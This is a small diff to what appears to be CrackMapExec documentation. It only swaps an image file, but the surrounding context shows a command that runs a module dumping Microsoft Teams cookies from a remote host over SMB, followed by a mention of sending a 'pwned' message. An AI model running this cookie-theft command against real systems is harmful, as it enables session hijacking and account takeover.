@@ -10,7 +10,7 @@ New CrackMapExec module to dump Microsoft Teams cookies thanks to [@KuiilSec](ht
 $ crackmapexec smb <ip> -u user -p pass -M teams_localdb
 ```
 
-<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
 
 Send the pwned message using this script:
 
